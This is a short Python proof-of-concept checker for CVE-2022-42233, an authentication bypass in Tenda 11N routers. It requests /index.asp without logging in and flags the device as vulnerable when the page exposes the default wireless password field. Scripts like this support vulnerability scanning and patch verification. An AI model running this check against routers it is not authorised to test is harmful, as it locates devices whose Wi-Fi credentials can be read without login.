# title: Tenda 11N - Authentication Bypass CVE-2022-42233
# author: antx
# cveid: CVE-2022-42233

from poctools import BasicPoc


class APoc(BasicPoc):

    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f'{url}/index.asp'
        try:
            resp = self.get(target)
            if resp.status_code == 200 and 'GoAhead-Webs' in str(resp.headers) and 'def_wirelesspassword' in resp.text and 'Tenda 11N' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1:8080'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
